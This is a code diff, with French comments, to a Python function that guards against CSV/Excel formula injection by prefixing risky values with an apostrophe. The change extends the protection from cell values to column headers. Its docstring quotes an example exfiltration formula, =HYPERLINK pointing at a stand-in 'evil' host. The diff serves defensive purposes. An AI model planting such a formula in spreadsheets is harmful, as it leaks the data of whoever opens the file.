@@ -14,6 +14,10 @@ FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")
 INVALID_EXCEL_SHEET_CHARS = re.compile(r"[:\\/?*\[\]]")
 
 
+def _neutralize_value(v):
+    return f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
+
+
 def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
     """Empêche l'injection de formule CSV/Excel (CWE-1236).
 
@@ -23,12 +27,17 @@ def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
     (ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des données dès
     l'ouverture du fichier). On préfixe ces valeurs d'une apostrophe,
     convention standard qui force leur traitement en texte.
+
+    Couvre aussi les **en-têtes de colonnes** : ce sont, tout autant que les
+    cellules, du texte tel quel du CSV téléversé -- un nom de colonne
+    `=HYPERLINK(...)` réexporté sans y toucher serait tout aussi exploitable
+    que la même valeur dans une cellule. Oublié dans la première version de
+    cette fonction (seules les valeurs de cellules étaient neutralisées).
     """
     df = df.copy()
+    df.columns = [_neutralize_value(c) for c in df.columns]
     for col in df.select_dtypes(include=["object", "str"]).columns:
-        df[col] = df[col].map(
-            lambda v: f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
-        )
+        df[col] = df[col].map(_neutralize_value)
     return df
 
 
